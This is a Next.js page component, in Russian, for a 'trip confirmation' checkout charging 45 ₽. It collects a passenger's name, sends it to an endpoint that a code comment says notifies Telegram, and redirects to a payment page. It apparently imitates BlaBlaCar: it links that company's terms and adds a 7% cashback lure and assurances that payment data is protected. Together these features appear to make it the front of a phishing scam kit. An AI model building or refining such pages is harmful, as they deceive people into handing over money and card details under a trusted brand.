'use client';

import React, { useState } from 'react';
import { useRouter } from 'next/navigation';

export default function Home() {
  const [accept, setAccept] = useState(true);
  const [cashback, setCashback] = useState(false);
  const [form, setForm] = useState({ firstName: '', lastName: '', middleName: '' });
  const [errors, setErrors] = useState<{ firstName?: string; lastName?: string }>({});
  const router = useRouter();

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setForm({ ...form, [e.target.name]: e.target.value });
    setErrors({ ...errors, [e.target.name]: undefined });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const newErrors: { firstName?: string; lastName?: string } = {};
    if (!form.firstName.trim()) newErrors.firstName = 'Пожалуйста, заполните это поле';
    if (!form.lastName.trim()) newErrors.lastName = 'Пожалуйста, заполните это поле';
    setErrors(newErrors);
    if (Object.keys(newErrors).length === 0) {
      // Отправляем уведомление в Telegram
      await fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          action: 'booking',
          firstName: form.firstName,
          lastName: form.lastName,
        }),
      });
      router.push('/payment');
    }
  };

  return (
    <main className="max-w-6xl mx-auto py-8 px-4 flex flex-col gap-8">
      <div className="flex flex-col md:flex-row gap-8">
        {/* Левая колонка */}
        <div className="flex-1 min-w-[340px]">
          <div className="text-lg text-[#0083a5] font-semibold mb-2">Подтверждение поездки → 45 ₽.</div>
          <div className="text-2xl font-bold mb-4 mt-6">Информация о попутчике</div>
          <div className="text-gray-500 text-sm mb-6 max-w-xl">
            Указывайте корректные имя, фамилию, так как они необходимы для идентификации пользователя, получения билета, возможности авторизации в учетной записи и возможности вернуть билет.
          </div>
          <form className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-8" onSubmit={handleSubmit} noValidate>
            <div className="flex flex-col gap-2">
              <label htmlFor="firstName" className="text-[#204950] text-xl font-bold mb-2">Имя</label>
              <input
                id="firstName"
                name="firstName"
                type="text"
                placeholder="Иван"
                value={form.firstName}
                onChange={handleChange}
                className={`rounded-3xl bg-[#efefef] px-6 py-4 text-lg w-full outline-none focus:ring-2 focus:ring-[#00aaff] font-semibold text-gray-500 placeholder:font-semibold placeholder:text-gray-400 border-0 shadow-none transition-all duration-200 ${errors.firstName ? 'ring-2 ring-red-400' : ''}`}
                required
              />
              {errors.firstName && <span className="text-red-500 text-sm mt-1">{errors.firstName}</span>}
            </div>
            <div className="flex flex-col gap-2">
              <label htmlFor="lastName" className="text-[#204950] text-xl font-bold mb-2">Фамилия</label>
              <input
                id="lastName"
                name="lastName"
                type="text"
                placeholder="Иванов"
                value={form.lastName}
                onChange={handleChange}
                className={`rounded-3xl bg-[#efefef] px-6 py-4 text-lg w-full outline-none focus:ring-2 focus:ring-[#00aaff] font-semibold text-gray-500 placeholder:font-semibold placeholder:text-gray-400 border-0 shadow-none transition-all duration-200 ${errors.lastName ? 'ring-2 ring-red-400' : ''}`}
                required
              />
              {errors.lastName && <span className="text-red-500 text-sm mt-1">{errors.lastName}</span>}
            </div>
            <div className="flex flex-col gap-2 md:col-span-2">
              <label htmlFor="middleName" className="text-[#204950] text-xl font-bold mb-2">Отчество</label>
              <input
                id="middleName"
                name="middleName"
                type="text"
                placeholder="Иванович"
                value={form.middleName}
                onChange={handleChange}
                className="rounded-3xl bg-[#efefef] px-6 py-4 text-lg w-full outline-none focus:ring-2 focus:ring-[#00aaff] font-semibold text-gray-500 placeholder:font-semibold placeholder:text-gray-400 border-0 shadow-none transition-all duration-200"
              />
            </div>
            <div className="md:col-span-2">
              <button type="submit" className="w-full bg-[#00aaff] hover:bg-[#0099ee] active:bg-[#0088dd] text-white text-xl font-bold rounded-full py-4 mt-2 shadow-lg transition-all duration-200 transform hover:-translate-y-1 hover:shadow-2xl focus:outline-none focus:ring-4 focus:ring-[#00aaff]/30">Забронировать</button>
            </div>
          </form>
          <div className="text-xl font-semibold mb-2">К оплате:</div>
          <div className="text-gray-500 text-sm mb-4">Ваши платежные и личные данные надежно защищены в соответствии с международными стандартами безопасности.</div>
          <div className="flex flex-col gap-2 mb-6">
            <label className="flex items-center gap-2 cursor-pointer">
              <input type="checkbox" checked={accept} onChange={() => setAccept(!accept)} className="accent-[#00aaff] w-5 h-5" />
              <span>Я принимаю условия <a href="https://blog.blablacar.ru/about-us/terms-and-conditions" className="text-[#00aaff] underline" target="_blank" rel="noopener noreferrer">публичной оферты</a>, <a href="https://blog.blablacar.ru/about-us/terms-and-conditions" className="text-[#00aaff] underline" target="_blank" rel="noopener noreferrer">политики конфиденциальности</a> и возврата денежных средств.</span>
            </label>
            <label className="flex items-center gap-2 cursor-pointer">
              <input type="checkbox" checked={cashback} onChange={() => setCashback(!cashback)} className="accent-[#00aaff] w-5 h-5" />
              <span>Получить кэшбек <span className="text-[#00aaff] font-semibold">7%</span> за оформление билета онлайн.</span>
            </label>
          </div>
        </div>
        {/* Правая колонка */}
        <div className="w-full md:w-[340px] flex flex-col gap-6">
          {/* Карточка оплаты */}
          <div className="bg-white rounded-2xl shadow-lg p-6 flex flex-col gap-3 border border-[#e6f3f8]">
            <div className="text-gray-500 text-sm">Подтверждение поездки</div>
            <div className="flex items-end gap-2">
              <span className="text-2xl font-extrabold text-[#0083a5]">45 ₽</span>
              <span className="text-base text-gray-500 mb-1">к оплате</span>
            </div>
          </div>
          {/* Блок информации */}
          <div className="bg-[#f3fbfd] rounded-2xl border border-[#ccecf6] p-5 flex gap-3 items-start shadow-sm">
            <div className="flex-shrink-0">
              <svg width="28" height="28" fill="none" viewBox="0 0 24 24"><circle cx="12" cy="12" r="12" fill="#00B4D8"/><text x="8.5" y="18" fill="white" fontSize="14" fontWeight="bold">i</text></svg>
            </div>
            <span className="text-sm text-[#0083a5] leading-snug">В случае отмены поездки зарезервированные средства вернутся моментально.</span>
          </div>
          {/* Иконки карт */}
          <div className="flex justify-center gap-5 items-center mt-2 bg-white rounded-xl py-4 shadow border border-[#e6f3f8]">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="mastercard" className="h-8" />
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="visa" className="h-8" />
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/Mir-logo.SVG.svg" alt="mir" className="h-8" />
          </div>
        </div>
      </div>
    </main>
  );
} 